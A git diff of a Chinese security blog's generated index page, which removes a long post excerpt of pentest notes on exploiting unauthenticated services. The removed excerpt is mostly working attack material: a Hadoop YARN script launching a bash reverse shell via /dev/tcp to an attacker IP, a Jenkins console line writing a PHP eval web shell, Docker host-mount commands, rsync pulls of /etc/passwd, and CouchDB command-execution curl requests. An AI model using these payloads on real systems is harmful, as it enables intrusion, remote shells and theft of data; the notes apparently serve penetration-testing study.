@@ -17,7 +17,7 @@
     <link rel="shortcut icon" href="/favicon.ico" >
     
     
-<link rel="stylesheet" href="/css/style.css?v=1610798105307.css">
+<link rel="stylesheet" href="/css/style.css?v=1610798423509.css">
 
     <!--[if lt IE 9]>
     
@@ -111,6 +111,56 @@
             
         </strong>
     </h3>
+    
+        <!-- 文章列表 item -->
+<article class="post">
+    <header>
+        <!-- 标签这有且只能显示一个 -->
+        
+        <a class="cat-link" href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
+        
+        <!-- 文章标题 -->
+        
+    <h3 class="post-title">
+    	<a href="https://givemefivw.github.io/2021/01/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%80%BB%E7%BB%93/">
+    		未授权验证总结
+    	</a>
+    </h3>
+
+    </header>
+    <p class="post-meta">
+        givemefivw 发表于
+        <time datetime="2021-01-16T11:56:23.000Z">2021-01-16</time>
+        &nbsp;&nbsp;
+        <span class="post-tags">
+            标签：
+            
+    
+        <a href="/tags/%E4%B9%8B%E6%88%91%E8%A7%81/" title="之我见">之我见</a>
+    
+
+        </span>
+    </p>
+
+    <div class="post-content">
+        <div class="post-excerpt">
+            
+                Docker_remote_api未授权;Elasticsearch 未授权;Hadoop 未授权;Jboss未授权;jenkins未授权;Memcached未授权
+            
+            <p class="more">
+                <a href="https://givemefivw.github.io/2021/01/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%80%BB%E7%BB%93/">阅读剩下更多</a>
+            </p>
+        </div>
+        <div class="post-thumbnail" data-img="">
+            <a href="https://givemefivw.github.io/2021/01/16/%E6%9C%AA%E6%8E%88%E6%9D%83%E9%AA%8C%E8%AF%81%E6%80%BB%E7%BB%93/" title="未授权验证总结">
+                
+                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/6.jpg" alt="默认配图" >
+                
+            </a>
+        </div>
+    </div>
+</article>
+
     
         <!-- 文章列表 item -->
 <article class="post">
@@ -428,123 +478,6 @@
         <!-- 文章标题 -->
         
     <h3 class="post-title">
-    	<a href="https://givemefivw.github.io/2021/01/09/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%90%88%E9%9B%86/">
-    		未授权访问验证总结
-    	</a>
-    </h3>
-
-    </header>
-    <p class="post-meta">
-        Jelon 发表于
-        <time datetime="2021-01-09T11:41:29.589Z">2021-01-09</time>
-        &nbsp;&nbsp;
-        <span class="post-tags">
-            标签：
-            
-    
-        <a href="/tags/%E7%AC%94%E8%AE%B0/" title="笔记">笔记</a>
-    
-
-        </span>
-    </p>
-
-    <div class="post-content">
-        <div class="post-excerpt">
-            
-                <h1 id="Docker-remote-api未授权"><a href="#Docker-remote-api未授权" class="headerlink" title="Docker_remote_api未授权"></a>Docker_remote_api未授权</h1><ul>
-<li><p>docker remote  api主要的目的是取代命令行界面,</p>
-</li>
-<li><p>docker client和docker daemon通过unix domain socket进行通信.</p>
-</li>
-<li><p>默认情况下，只有本机的root和docker组用户才能操作docker.</p>
-<h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2></li>
-<li><p>远程对被攻击主机的docker容器进行操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker  -H tcp:&#x2F;&#x2F;host:2375 images</span><br></pre></td></tr></table></figure></li>
-<li><p>远程启动被攻击主机的docker容器，并挂载宿主机的目录，通过容器来修改宿主机的author ized_ keys文件，写入公钥</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker H tcp:&#x2F;&#x2F;host:2375 run -it-v &#x2F;:&#x2F;mnt imagelD &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/pythonal/p/9207696.html">https://www.cnblogs.com/pythonal/p/9207696.html</a></p>
-<h1 id="Elasticsearch-未授权"><a href="#Elasticsearch-未授权" class="headerlink" title="Elasticsearch 未授权"></a>Elasticsearch 未授权</h1><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:9200&#x2F;_cat&#x2F;indices</span><br><span class="line">http:&#x2F;&#x2F;localhost:9200&#x2F;_river&#x2F;_search 查看数据库敏感信息</span><br><span class="line">http:&#x2F;&#x2F;localhost:9200&#x2F;_nodes 查看节点数据</span><br><span class="line">	</span><br><span class="line">如有安装head插件：</span><br><span class="line">http:&#x2F;&#x2F;localhost:9200&#x2F;_plugin&#x2F;head&#x2F; web管理界面</span><br></pre></td></tr></table></figure></li>
-<li><p>脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># _*_  coding:utf-8 _*_</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line">def Elasticsearch_check(ip, port&#x3D;9200, timeout&#x3D;5):</span><br><span class="line">    try:</span><br><span class="line">    　　url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+str(port)+&quot;&#x2F;_cat&quot;</span><br><span class="line">    　　response &#x3D; requests.get(url) </span><br><span class="line">    except:</span><br><span class="line">    　　pass</span><br><span class="line">    if &quot;&#x2F;_cat&#x2F;master&quot; in response.content:</span><br><span class="line">    　　print &#39;[+] Elasticsearch Unauthorized: &#39; +ip+&#39;:&#39;+str(port)</span><br><span class="line"> </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    Elasticsearch_check(&quot;127.0.0.1&quot;)</span><br></pre></td></tr></table></figure>
-<h1 id="Hadoop-未授权"><a href="#Hadoop-未授权" class="headerlink" title="Hadoop 未授权"></a>Hadoop 未授权</h1><h2 id="POC脚本"><a href="#POC脚本" class="headerlink" title="POC脚本"></a>POC脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"> </span><br><span class="line">import requests</span><br><span class="line"> </span><br><span class="line">target &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1:8088&#x2F;&#39;</span><br><span class="line">lhost &#x3D; &#39;192.168.220.137&#39; # put your local host ip here, and listen at port 9999</span><br><span class="line"> </span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#x2F;new-application&#39;</span><br><span class="line">resp &#x3D; requests.post(url)</span><br><span class="line">app_id &#x3D; resp.json()[&#39;application-id&#39;]</span><br><span class="line">url &#x3D; target + &#39;ws&#x2F;v1&#x2F;cluster&#x2F;apps&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;application-id&#39;: app_id,</span><br><span class="line">    &#39;application-name&#39;: &#39;get-shell&#39;,</span><br><span class="line">    &#39;am-container-spec&#39;: &#123;</span><br><span class="line">        &#39;commands&#39;: &#123;</span><br><span class="line">            &#39;command&#39;: &#39;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;%s&#x2F;9999 0&gt;&amp;1&#39; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;application-type&#39;: &#39;YARN&#39;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json&#x3D;data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">修改.py中的反弹IP</span><br><span class="line">python exploit.py</span><br><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>
-<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p>  <a target="_blank" rel="noopener" href="https://blog.csdn.net/xuandao_ahfengren/article/details/107127276">https://blog.csdn.net/xuandao_ahfengren/article/details/107127276</a></p>
-<h1 id="Jboss未授权"><a href="#Jboss未授权" class="headerlink" title="Jboss未授权"></a>Jboss未授权</h1><h2 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h2></li>
-<li><p>直接访问<a target="_blank" rel="noopener" href="http://host/jmx-console%EF%BC%8C%E6%97%A0%E9%9C%80%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81%E5%8D%B3%E5%8F%AF%E7%99%BB%E5%BD%95jboss">http://host/jmx-console，无需用户名和密码即可登录jboss</a> web控制台</p>
-</li>
-<li><p>利用脚本进行验证</p>
-<h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11240183.html">https://www.cnblogs.com/yuzly/p/11240183.html</a><br>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hack-Devil/p/13741604.html">https://www.cnblogs.com/Hack-Devil/p/13741604.html</a></p>
-<h1 id="jenkins未授权"><a href="#jenkins未授权" class="headerlink" title="jenkins未授权"></a>jenkins未授权</h1><h2 id="验证-2"><a href="#验证-2" class="headerlink" title="验证"></a>验证</h2><p>访问<a target="_blank" rel="noopener" href="http://host/manage/%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%A6%82%E6%9E%9C%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%EF%BC%8C%E5%88%99%E7%AE%A1%E7%90%86%E5%90%8E%E5%8F%B0%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE">http://host/manage/页面，如果存在未授权，则管理后台可以直接访问</a></p>
-</li>
-</ul>
-<p>利用管理后台的“脚本命令行”执行系统操作</p>
-<ul>
-<li>println “whoami”.execute().text</li>
-<li>绝对路径写Shell</li>
-<li>new File(“D:\phpstudy_pro\WWW\shell.php”).write(‘<?php @eval($_POST[pwd]);?>‘);<h2 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h2>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/rnss/p/13378182.html">https://www.cnblogs.com/rnss/p/13378182.html</a><br>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11255609.html">https://www.cnblogs.com/yuzly/p/11255609.html</a><h1 id="Memcached未授权"><a href="#Memcached未授权" class="headerlink" title="Memcached未授权"></a>Memcached未授权</h1><h2 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h2><h3 id="一-telnet-host-11211"><a href="#一-telnet-host-11211" class="headerlink" title="一 telnet host 11211"></a>一 telnet host 11211</h3>Trying 12x.13x.xx.xx…<br>Connected to 12x.13x.xx.xxx.<br>Escape character is ‘^]’.<br>说明漏洞存在</li>
-</ul>
-<h2 id="参考-4"><a href="#参考-4" class="headerlink" title="参考"></a>参考</h2><pre><code>https://www.cnblogs.com/buxuan/articles/6274677.html</code></pre>
-<h1 id="MongonDB未授权"><a href="#MongonDB未授权" class="headerlink" title="MongonDB未授权"></a>MongonDB未授权</h1><h2 id="验证-3"><a href="#验证-3" class="headerlink" title="验证"></a>验证</h2><ul>
-<li>mongo服务默认端口27017</li>
-<li>mongo 【host】 【port】</li>
-<li>msf&gt; search mongo</li>
-</ul>
-<h2 id="参考-5"><a href="#参考-5" class="headerlink" title="参考"></a>参考</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;212799.html</span><br></pre></td></tr></table></figure>
-<h1 id="Redis-未授权"><a href="#Redis-未授权" class="headerlink" title="Redis 未授权"></a>Redis 未授权</h1><h2 id="验证-4"><a href="#验证-4" class="headerlink" title="验证"></a>验证</h2><ul>
-<li>Nmap -A -p 6379 –script redis-info ip</li>
-<li>redis-cli -h ip</li>
-<li>info<h2 id="参考-6"><a href="#参考-6" class="headerlink" title="参考"></a>参考</h2>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a><br>  <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/207877.html">https://www.freebuf.com/articles/web/207877.html</a><h1 id="Rsync-未授权"><a href="#Rsync-未授权" class="headerlink" title="Rsync 未授权"></a>Rsync 未授权</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2>rsync是Linux/Unix下的一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件和目录，默认运行在873端口。由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。<br>rsync未授权访问带来的危害主要有两个：一是造成了严重的信息泄露；二是上传脚本后门文件，远程命令执行。<h2 id="验证-amp-利用"><a href="#验证-amp-利用" class="headerlink" title="验证&amp;利用"></a>验证&amp;利用</h2></li>
-<li>nmap -p 873 host  //目标是否开放rsync服务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rsync host::</span><br><span class="line"></span><br><span class="line">rsync rsync:&#x2F;&#x2F;host:873</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;列出目标服务器的同步目录</span><br></pre></td></tr></table></figure></li>
-<li>查看模块文件<br>获取到目录之后，只需在路径后添加目录名即可查看目录中的文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync host::src</span><br></pre></td></tr></table></figure></li>
-<li>下载任意目录文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rsync -av host::src&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">rsync -av host::src&#x2F;etc&#x2F;passwd .&#x2F;</span><br></pre></td></tr></table></figure></li>
-<li>上传任意文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rsync -av filepath rsync:&#x2F;&#x2F;host:873&#x2F;filepath</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;rsync -av 文件路径 rsync:&#x2F;&#x2F;host:873&#x2F;目标系统文件路径</span><br></pre></td></tr></table></figure></li>
-<li>nmap 脚本扫描<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 873 --script&#x3D;rsync-list-modules host</span><br></pre></td></tr></table></figure></li>
-<li>msf探测<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search rsync</span><br></pre></td></tr></table></figure>
-<h2 id="参考-7"><a href="#参考-7" class="headerlink" title="参考"></a>参考</h2>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/renhaoblog/p/13279101.html">https://www.cnblogs.com/renhaoblog/p/13279101.html</a><h1 id="VNC-未授权"><a href="#VNC-未授权" class="headerlink" title="VNC 未授权"></a>VNC 未授权</h1><h2 id="验证-5"><a href="#验证-5" class="headerlink" title="验证"></a>验证</h2></li>
-<li>VNC默认端口5900、5901</li>
-<li>使用VNC Viewer工具或可直接连接目标IP<h1 id="ZooKeeper-未授权"><a href="#ZooKeeper-未授权" class="headerlink" title="ZooKeeper 未授权"></a>ZooKeeper 未授权</h1><h2 id="验证-6"><a href="#验证-6" class="headerlink" title="验证"></a>验证</h2></li>
-<li>默认端口 2181</li>
-<li>echo envi|nc host 2181<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">echo stat |ncat host 2181 &#x2F;&#x2F;列出关于性能和连接的客户端的统计信息</span><br><span class="line"></span><br><span class="line">echo ruok |ncat host 2181 &#x2F;&#x2F;测试服务器是否运行在非错误状态</span><br><span class="line"></span><br><span class="line">echo reqs |ncat host 2181 &#x2F;&#x2F;列出未完成的请求</span><br><span class="line"></span><br><span class="line">echo envi |ncat host 2181 &#x2F;&#x2F;打印有关服务环境的详细信息</span><br><span class="line"></span><br><span class="line">echo dump |ncat host 2181 &#x2F;&#x2F;列出未完成的会话和临时节点</span><br></pre></td></tr></table></figure>
-<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2></li>
-<li>修改 ZooKeeper 默认端口，采用其他端口服务</li>
-<li>添加访问控制，配置服务来源地址限制策略</li>
-<li>增加 ZooKeeper 的认证配置<h2 id="参考-8"><a href="#参考-8" class="headerlink" title="参考"></a>参考</h2>  <a target="_blank" rel="noopener" href="https://www.pianshen.com/article/742875645/">https://www.pianshen.com/article/742875645/</a><h1 id="通达OA前台任意用户伪造登"><a href="#通达OA前台任意用户伪造登" class="headerlink" title="通达OA前台任意用户伪造登"></a>通达OA前台任意用户伪造登</h1><h2 id="使用EXP脚本"><a href="#使用EXP脚本" class="headerlink" title="使用EXP脚本"></a>使用EXP脚本</h2></li>
-</ul>
-<ol>
-<li>python3 poc.py -v 版本 -url url</li>
-<li>运行并获取到可用的SESSIONID</li>
-<li>替换浏览器Cookie中的SESSIONID即可实现登录为admin<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2></li>
-</ol>
-<ul>
-<li>通达OA2017</li>
-<li>V11.X&lt;V11.5<h2 id="参考-9"><a href="#参考-9" class="headerlink" title="参考"></a>参考</h2>  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/cowherd/p/13044596.html">https://www.cnblogs.com/cowherd/p/13044596.html</a><h1 id="Atlassian-Crowd-未授权"><a href="#Atlassian-Crowd-未授权" class="headerlink" title="Atlassian Crowd 未授权"></a>Atlassian Crowd 未授权</h1><h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2>python CVE-2019-11580.py <a target="_blank" rel="noopener" href="http://host/">http://host</a><h1 id="CouchDB-未授权"><a href="#CouchDB-未授权" class="headerlink" title="CouchDB 未授权"></a>CouchDB 未授权</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">新增query_server配置，这里执行ifconfig命令</span><br><span class="line"></span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;1.1.1.1:5984&#x2F;_config&#x2F;query_servers&#x2F;cmd&#39; -d &#39;&quot;&#x2F;sbin&#x2F;ifconfig &gt;&#x2F;tmp&#x2F;6666&quot;&#39;</span><br><span class="line"></span><br><span class="line">新建一个临时表，插入一条记录</span><br><span class="line"></span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;1.1.1.1:5984&#x2F;vultest&#39;</span><br><span class="line">curl -X PUT &#39;http:&#x2F;&#x2F;1.1.1.1:5984&#x2F;vultest&#x2F;vul&#39; -d &#39;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&#39;</span><br><span class="line"></span><br><span class="line">调用query_server处理数据</span><br><span class="line"></span><br><span class="line">curl -X POST &#39;http:&#x2F;&#x2F;1.1.1.1:5984&#x2F;vultest&#x2F;_temp_view?limit&#x3D;11&#39; -d &#39;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&#39; -H &#39;Content-Type: application&#x2F;json&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
-</ul>
-
-            
-            <p class="more">
-                <a href="https://givemefivw.github.io/2021/01/09/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%90%88%E9%9B%86/">阅读剩下更多</a>
-            </p>
-        </div>
-        <div class="post-thumbnail" data-img="">
-            <a href="https://givemefivw.github.io/2021/01/09/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%90%88%E9%9B%86/" title="未授权访问验证总结">
-                
-                    <img class="thumbnail" src="/img/default.png" data-echo="/img/thumbnail/9.jpg" alt="默认配图" >
-                
-            </a>
-        </div>
-    </div>
-</article>
-
-    
-        <!-- 文章列表 item -->
-<article class="post">
-    <header>
-        <!-- 标签这有且只能显示一个 -->
-        
-            <a href="javascript: void(0);" class="cat">未分类</a>
-        
-        <!-- 文章标题 -->
-        
-    <h3 class="post-title">
     	<a href="https://givemefivw.github.io/2021/01/07/CVE-2020-17519%20Apache%20Flink%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9EPOC/">
     		CVE-2020-17519 Apache Flink 任意文件读取漏洞
     	</a>
@@ -640,7 +573,7 @@
     
     <li>
         <a href="/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/">技术文章</a>
-        <span class="badge">(2)</span>
+        <span class="badge">(3)</span>
     </li>
     
 </ul>
@@ -658,7 +591,7 @@
   
     <a class="tag-item" href="/tags/%E5%85%8D%E6%9D%80%E5%AE%9E%E9%AA%8C%E7%AC%94%E8%AE%B0/" title="免杀实验笔记">免杀实验笔记 (5)</a>
   
-    <a class="tag-item" href="/tags/%E7%AC%94%E8%AE%B0/" title="笔记">笔记 (1)</a>
+    <a class="tag-item" href="/tags/%E4%B9%8B%E6%88%91%E8%A7%81/" title="之我见">之我见 (1)</a>
   
 </div>
     </section>
@@ -702,7 +635,7 @@
     <!--博客js脚本 -->
     <!-- 这里放网站js脚本 -->
 
-<script src="/js/main.js?v=1610798105308.js"></script>
+<script src="/js/main.js?v=1610798423510.js"></script>
 
 
 </body>
